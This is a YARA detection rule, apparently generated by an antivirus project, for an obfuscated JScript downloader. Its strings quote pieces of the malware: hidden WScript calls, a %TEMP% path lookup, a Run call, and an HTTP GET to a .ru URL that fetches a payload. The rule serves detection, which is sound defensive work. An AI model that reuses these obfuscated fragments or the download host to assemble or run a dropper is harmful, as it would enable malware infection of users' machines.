rule sig_20160428_10e0afe58312ecdd32d2830ba60e81a4 {
  meta:
    description = "datamaliciousorder - file 20160428_10e0afe58312ecdd32d2830ba60e81a4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4ec1c49fd80226cbc7b4ffec88db06c8376176eeeb620e39ebc0445f9a3d820e"

  strings:
    $s1  = "function YljVdwAnvGjnIunXfuEpw() {return DrhYadNquJfqMnfIqsLwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function AidNovPfhNioLzxBgtZeg(RxlXqcRfsHlhZyhNiuRlg){DrhYadNquJfqMnfIqsLwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AidNovPfhNioLzxBgtZeg(RxlXqcRfsHlhZyhNiuRlg){DrhYadNquJfqMnfIqsLwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function WmdIokZdgAzgVkdIyuWhv(XugYtnCctWdiTboFgcMlq, PiyZltKjbZouBddNmaIxi){CnmRnzBikWujWtyQuvGcs = CnmRnzBikWujWtyQuvGcs * 1; " ascii
    $s5  = "var DrhYadNquJfqMnfIqsLwu = function CpjDyaAbwSjdUpsFaoEkg() {return QfvDuvJguDesQleLsfZvj[FvcYhsFzfEtjAvjVnmPje](\"WScript\"+\"" ascii
    $s6  = "return XugYtnCctWdiTboFgcMlq - PiyZltKjbZouBddNmaIxi;};" fullword ascii
    $s7  = "HtqZofIzdDsjRgnYppQhy[OakLiaXvxLwpUayKtpDoh](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var DrhYadNquJfqMnfIqsLwu = function CpjDyaAbwSjdUpsFaoEkg() {return QfvDuvJguDesQleLsfZvj[FvcYhsFzfEtjAvjVnmPje](\"WScript\"+\"" ascii
    $s9  = "var QfvDuvJguDesQleLsfZvj = this[\"WScript\"];" fullword ascii
    $s10 = "function YljVdwAnvGjnIunXfuEpw() {return DrhYadNquJfqMnfIqsLwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (HtqZofIzdDsjRgnYppQhy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function WmdIokZdgAzgVkdIyuWhv(XugYtnCctWdiTboFgcMlq, PiyZltKjbZouBddNmaIxi){CnmRnzBikWujWtyQuvGcs = CnmRnzBikWujWtyQuvGcs * 1; " ascii
    $s13 = "function BghIrbRweIqdMmwYefTet(){return AozUcdKqfUfzCdzQwsRja + \"\";};" fullword ascii
    $s14 = "function XjmFxhImgSksCyoKkeQsh(){return 23;};" fullword ascii
    $s15 = "var NfeXedQbiTpdTemTqgApf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function YtiIakPktHxoVsxBqoVey(AvjUelRobBwaNccBewSuw) {var KzsJoqMobKawLvkCrgReq = (1, 2, 3, 4, 5, AvjUelRobBwaNccBewSuw); retur" ascii
    $s17 = "RytWewQffKsoSdfYckSgf = true; " fullword ascii
    $s18 = "var BlfYolUcnHtqOfrFaiRih = false;" fullword ascii
    $s19 = "var XyvOhrKmdFxoVhsHmuKnt = false;" fullword ascii
    $s20 = "function YtiIakPktHxoVsxBqoVey(AvjUelRobBwaNccBewSuw) {var KzsJoqMobKawLvkCrgReq = (1, 2, 3, 4, 5, AvjUelRobBwaNccBewSuw); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}